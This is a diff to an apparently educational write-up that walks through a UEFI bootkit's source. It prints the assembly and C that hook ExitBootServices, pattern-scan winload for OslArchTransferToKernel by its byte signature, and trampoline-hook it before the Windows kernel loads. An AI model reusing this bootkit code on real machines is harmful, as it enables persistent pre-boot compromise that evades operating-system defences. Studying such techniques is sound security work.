@@ -58,8 +58,58 @@ The most important piece here is the [BootServices](https://uefi.org/specs/UEFI/
 With that out of the way, the code here is very easy!
 1. It saves several pointers in a global namespace (the services and the system table itself).
 2. It saves the function pointer to `ExitBootServices` in that global as well, and then hooks it with the `ExitBootServicesWrapper` function. Note `ExitBootServices` is called just before the handoff to the OS kernel, so that's an excellent point to hook! Also note how easy it is to hook when you have function pointers and no page protections - essentially it's a single assignment in C!
-3. It creates a callback for `SetVirtualAddressMap`, which we'll be using later.  
+3. It creates a callback for `SetVirtualAddressMap`, which we'll be using later
+
 With that, let's continue to the `ExitBootServicesWrapper` function!
 
+### Hooking OslArchTransferToKernel
+The `ExitBootServicesWrapper` function (`Bootkit/ExitBootServicesWrapper.asm`) is actually coded in Assembly, but it's so short it's extremely easy to analyze:
+
+```assembly
+ExitBootServicesWrapper proc
+    mov rax, [rsp]
+    mov RetExitBootServices, rax
+    jmp ExitBootServicesHook
+ExitBootServicesWrapper endp
+```
+
+Since the return address is saved in the stack, `mov rax, [rsp]` simply saves that return address in the `RAX` register, puts it in a global called `RetExitBootServices` and transfers control to `ExitBootServicesHook`.  
+The `ExitBootServicesHook` function (`Bootkit/ExitBootServices.cpp`) is also easy to read:
+
+```c
+EFI_STATUS EFIAPI ExitBootServicesHook(IN EFI_HANDLE ImageHandle, IN UINTN MapKey)
+{
+    SET_BACKGROUND(EFI_WHITE | EFI_BACKGROUND_RED);
+    CLEAR_SCREEN();
+    Log("Bootkit hook-chain sequence started");
+    SLEEP(500);
+
+    global::winload = memory::get_image_base(global::RetExitBootServices);
+    if (!global::winload) 
+    {
+        Error("Can't find winload base!");
+    }
+    Log("Successfully found winload base");
+
+    global::OslArchTransferToKernel = memory::scan_section(global::winload, ".text", (uint8_t*)&OslArchTransferToKernelPattern, sizeof(OslArchTransferToKernelPattern));
+    if (!global::OslArchTransferToKernel)
+    {
+        Error("Can't find OslArchTransferToKernel address!");
+    }
+    Log("Successfully found OslArchTransferToKernel address");
+
+    trampoline::Hook(global::OslArchTransferToKernel, (uint64_t) OslArchTransferToKernelHook, (uint8_t*) &global::OslArchTransferToKernelData);
+
+    Log("ExitBootServices stage complete");
+    global::BootServices->ExitBootServices = (EFI_EXIT_BOOT_SERVICES)global::ExitBootServices;
+    return global::ExitBootServices(ImageHandle, MapKey);
+}
+```
+
+The first part simply does some printing and logging, so we'll be skipping that part. The next parts are more interesting:
+1. We save the PE image base of `RetExitBootServices` (the global we saved back in the Assembly code). Note `ExitBootServices` was called by `winload` (the Windows bootloader), so the return address for `ExitBootServices` exactly resides in `winload`. The `memory::get_image_base` function is quite heuristic but easy to understand - it searches for PE header ("MZ") in each aligned page, going backwards. I will be explaining it after the overview of this hook.
+2. We find the function `OslArchTransferToKernel` function in `winload` by calling `memory::scan_section`, simply by finding a pattern in memory. We will be explaining how it works too, but you can think of it as [memmem](https://www.man7.org/linux/man-pages/man3/memmem.3.html) function in essence. The pattern `OslArchTransferToKernelPattern` is defined in `Bootkit/struct.h` and is defined as the bytes `0x33, 0xF6, 0x4C, 0x8B, 0xE1, 0x4C, 0x8B, 0xEA`, which matches the first few instructions of `OslArchTransferToKernel` function in `winload`.
+3. We hook `OslArchTransferToKernel` and divert control to `OslArchTransferToKernelHook`. Note this is a different kind of hook! The previous EFI hook was done with function pointers, but the transition to `OslArchTransferToKernel` does not involve function pointers, so we rely on Trampoline hooking, which is a fancy way of saying we patch the assembly to jump somewhere else.
+4. We restore the `ExitBootServices` function which we saved easlier and invoke it to transfer control back to `winload`.
 
 
